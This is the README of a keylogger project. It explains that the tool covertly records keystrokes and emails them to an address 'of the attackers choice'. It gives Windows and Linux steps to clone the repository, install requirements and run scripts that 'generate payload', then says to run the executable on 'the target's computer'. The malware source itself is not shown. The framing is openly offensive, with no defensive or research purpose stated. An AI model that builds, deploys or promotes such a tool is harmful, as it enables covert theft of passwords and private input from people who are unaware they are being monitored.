# KeyLogger
## Raghuram \\\ Compromyse

**Keystroke logging**, often referred to as **keylogging** or keyboard capturing, is the action of **recording** the keys struck on a keyboard, typically covertly, so that a person using the keyboard is unaware that their actions are being **monitored**. Data can then be retrieved by the person operating the logging program.

This keylogger logs keyboard input and mails it to an email of the attackers choice at an interval of choice.

# Usage

## Windows

> Install requirements:

* Install python3 from https://python.org and git from https://git-scm.com.
* Clone the repository
```bash
git clone https://github.com/compromyse/KeyLogger
```
* Install python requirements
```bash
python -m pip install -r requirements.txt
```

> Generate payload:

```bash
python compile_for_windows.py
```

Then run the generated executable in the target's computer.

## Linux

> Install requirements

* Install python3 from your package manager.

```bash
debian \ ubuntu: $ sudo apt install python3 python3-pip git
arch: $ sudo pacman -S python python-pip git
```
* Clone the repository
```bash
git clone https://github.com/compromyse/KeyLogger
```
* Install python requirements
```bash
python3 -m pip install -r requirements.txt
```

> Generate payload:

```bash
python3 compile_for_linux.py
```

Then run the generated executable in the target's computer.